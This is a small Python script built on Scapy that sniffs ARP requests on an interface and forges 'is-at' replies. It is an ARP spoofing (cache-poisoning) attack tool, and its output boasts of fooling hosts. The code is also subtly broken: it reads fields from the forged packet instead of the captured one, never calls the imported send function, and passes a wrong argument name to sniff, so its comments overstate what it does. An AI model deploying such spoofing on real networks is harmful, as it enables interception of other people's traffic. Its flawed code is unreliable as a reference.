#!/usr/bin/python

"""
Checks every packet if it is an arp request.
If it is, it forges its own, and sending the newly generated packet alongside the original packet.
The first packet to reach the server, gets the response.
"""

import sys
from scapy.all import sniff, sendp, ARP, Ether


# Exits if no interface is specified in script execution
if len(sys.argv) < 2:
    print(f"{sys.argv[0]}: <interface>")
    sys.exit(0)

def arp_poison_callback(packet):
    # Check for ARP request
    if packet[ARP].op == 1: # checks if packet is an ARP request
        # Generate response packet with the source MAC and IP of the request packet as destination MAC and IP
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        answer[ARP].op = "is-at"
        answer[ARP].hwdst = answer[ARP].hwsrc
        answer[ARP].psrc = answer[ARP].pdst
        answer[ARP].pdst = answer[ARP].psrc
        # Scapy automatically inserts the addresses of the sending network interface
        print(f"Fooling {packet[ARP].psrc} that {packet[ARP].pdst} is me!")

# Reads packets in an endless loop
sniff(prn=arp_poison_callback,
      filter="arp", # PCAP filter that guarrentees the callback function only gets called with ARP packets as input
      interface = sys.argv[1],
      store=0)  # Ensures the packet only gets saved in memory